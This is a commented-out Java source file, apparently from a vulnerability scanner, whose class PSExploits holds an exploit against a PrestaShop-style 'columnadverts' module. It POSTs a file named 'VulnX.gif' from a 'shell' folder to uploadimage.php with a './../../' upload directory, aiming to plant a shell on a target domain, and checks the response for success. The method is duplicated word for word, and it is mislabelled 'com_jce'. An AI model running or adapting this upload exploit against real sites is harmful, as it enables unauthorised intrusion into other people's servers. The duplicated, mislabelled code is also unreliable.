//package com.funtap.awass.Exploit;
//
//import com.funtap.awass.Exploit.Result.Result;
//import okhttp3.*;
//
//import java.io.FileInputStream;
//import java.io.IOException;
//import java.io.InputStream;
//
//public class PSExploits {
//    public Result columnadverts(String domain, String cookie){
//        Result result = new Result();
//        try {
//            // url attack
//            String endpoint = domain + "/modules/columnadverts/uploadimage.php";
//            endpoint = endpoint.replaceAll("//modules","/modules");
//            String shell = "";
//            Response response = null;
//            OkHttpClient client = new OkHttpClient().newBuilder()
//                    .build();
//            MediaType mediaType = MediaType.parse("image/gif");
//            //read shell
//
//            RequestBody body = RequestBody.create(mediaType, "{\r\n\"upload-dir\":\"./../../\",\r\n\"upload-overwrite\":0,\r\n\"Filedata\" : \"src/main/java/com/funtap/awass/Exploit/shell/VulnX.gif\",\r\n\"action\":\"Upload\"\r\n}\r\n");
//            //check cookie
//            if (cookie == null) {
//                Request request = new Request.Builder()
//                        .url(endpoint)
//                        .method("POST", body)
//                        .build();
//                response = client.newCall(request).execute();
//            } else {
//                Request request = new Request.Builder()
//                        .url(endpoint)
//                        .method("POST", body)
//                        .addHeader("Cookie", cookie)
//                        .build();
//                response = client.newCall(request).execute();
//            }
//            //check response
//            String res = response.body().string();
//
//            System.out.println(response.code());
//            if (res.contains("/image/gif/")) {
//                result = new Result(endpoint, "com_jce", true, "VulnX.gif");
//            } else {
//                result = new Result(endpoint, "com_jce", false, "VulnX.gif");
//            }
//            String dump_data = domain + "/VulnX.gif";
//        } catch (Exception e) {
//            System.out.println(e.getMessage());
//        }
//        return result;
//    }
//
//    public Result columnadverts(String domain, String cookie){
//        Result result = new Result();
//        try {
//            // url attack
//            String endpoint = domain + "/modules/columnadverts/uploadimage.php";
//            endpoint = endpoint.replaceAll("//modules","/modules");
//            String shell = "";
//            Response response = null;
//            OkHttpClient client = new OkHttpClient().newBuilder()
//                    .build();
//            MediaType mediaType = MediaType.parse("image/gif");
//            //read shell
//
//            RequestBody body = RequestBody.create(mediaType, "{\r\n\"upload-dir\":\"./../../\",\r\n\"upload-overwrite\":0,\r\n\"Filedata\" : \"src/main/java/com/funtap/awass/Exploit/shell/VulnX.gif\",\r\n\"action\":\"Upload\"\r\n}\r\n");
//            //check cookie
//            if (cookie == null) {
//                Request request = new Request.Builder()
//                        .url(endpoint)
//                        .method("POST", body)
//                        .build();
//                response = client.newCall(request).execute();
//            } else {
//                Request request = new Request.Builder()
//                        .url(endpoint)
//                        .method("POST", body)
//                        .addHeader("Cookie", cookie)
//                        .build();
//                response = client.newCall(request).execute();
//            }
//            //check response
//            String res = response.body().string();
//
//            System.out.println(response.code());
//            if (res.contains("/image/gif/")) {
//                result = new Result(endpoint, "com_jce", true, "VulnX.gif");
//            } else {
//                result = new Result(endpoint, "com_jce", false, "VulnX.gif");
//            }
//            String dump_data = domain + "/VulnX.gif";
//        } catch (Exception e) {
//            System.out.println(e.getMessage());
//        }
//        return result;
//    }
//}
